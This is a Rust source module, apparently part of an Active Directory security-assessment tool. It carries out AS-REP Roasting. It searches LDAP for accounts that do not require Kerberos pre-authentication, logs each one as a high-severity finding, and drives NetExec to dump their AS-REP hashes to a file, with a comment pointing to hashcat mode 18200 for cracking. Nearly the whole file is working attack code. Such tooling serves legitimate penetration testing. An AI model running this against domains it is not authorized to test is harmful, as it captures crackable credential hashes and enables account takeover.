//! AS-REP Roasting: find accounts with DONT_REQ_PREAUTH, dump AS-REP hashes.

use super::{AttackContext, require_nxc};
use crate::findings::{CheckStatus, Finding, ScanResults, Severity};
use crate::scanner::ldap::{LdapClient, USER_ATTRS, asreproastable_filter};
use anyhow::Result;

/// Discover AS-REP roastable accounts natively, then capture AS-REP hashes
/// via nxc (unauthenticated KRB_AS_REQ per account).
pub async fn run(ctx: &AttackContext<'_>, results: &ScanResults) -> Result<()> {
    let entries = ctx
        .ldap
        .search(&ctx.ldap_base_dn(), asreproastable_filter(), USER_ATTRS)
        .await?;

    if entries.is_empty() {
        results.push(Finding::new(
            ctx.dc,
            "kerberos",
            "asreproast",
            CheckStatus::NotVulnerable,
            Severity::Info,
            serde_json::json!({ "message": "no accounts with DONT_REQ_PREAUTH found" }),
        ));
        return Ok(());
    }

    for e in &entries {
        let sam = LdapClient::attr(e, "sAMAccountName").unwrap_or("?");
        results.push(Finding::new(
            ctx.dc,
            "kerberos",
            "asreproast",
            CheckStatus::Vulnerable,
            Severity::High,
            serde_json::json!({
                "account": sam,
                "note": "AS-REP hash obtainable without credentials; crack with hashcat -m 18200",
            }),
        ));
    }

    let nxc = match require_nxc(ctx.nxc) {
        Ok(n) => n,
        Err(err) => {
            results.push(Finding::new(
                ctx.dc,
                "kerberos",
                "asreproast",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": format!("discovery complete; {}", err) }),
            ));
            return Ok(());
        }
    };

    // nxc asreproast uses empty-password semantics internally; valid creds
    // are still supplied for the LDAP lookup of roastable accounts.
    let mut args: Vec<&str> = vec!["ldap", ctx.dc];
    let secret = ctx.nxc_secret_args();
    let secret_refs: Vec<&str> = secret.iter().map(String::as_str).collect();
    args.extend(secret_refs);
    let outfile = ctx.out_dir.join("asreproast.hashes");
    let outfile_str = outfile.to_string_lossy().to_string();
    args.extend(["--asreproast", outfile_str.as_str()]);
    match nxc.run(&args).await {
        Ok((stdout, stderr, success)) => {
            if success && outfile.exists() {
                results.push(Finding::info(
                    ctx.dc,
                    "kerberos",
                    "asreproast",
                    format!("AS-REP hashes saved to {}", outfile.display()),
                ));
            } else {
                results.push(Finding::new(
                    ctx.dc,
                    "kerberos",
                    "asreproast",
                    CheckStatus::Error,
                    Severity::Info,
                    serde_json::json!({
                        "message": "nxc asreproast did not produce hashes",
                        "stdout": stdout.trim(),
                        "stderr": stderr.trim(),
                    }),
                ));
            }
        }
        Err(e) => {
            results.push(Finding::new(
                ctx.dc,
                "kerberos",
                "asreproast",
                CheckStatus::Error,
                Severity::Info,
                serde_json::json!({ "message": e.to_string() }),
            ));
        }
    }
    Ok(())
}
